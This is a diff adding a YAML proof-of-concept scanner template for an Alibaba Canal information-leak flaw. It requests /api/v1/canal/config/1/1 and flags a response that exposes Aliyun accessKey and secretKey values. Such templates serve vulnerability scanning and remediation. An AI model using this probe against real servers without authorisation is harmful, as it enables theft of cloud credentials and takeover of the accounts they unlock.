@@ -1,0 +1,23 @@
+id: poc-yaml-alibaba-canal-info-leak
+info:
+  name: Alibaba Canal 信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: Alibaba Canal
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /api/v1/canal/config/1/1
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
+    "application/json") && contains(body, "ncanal.aliyun.accessKey") && contains(body,
+    "ncanal.aliyun.secretKey")
+  output: []
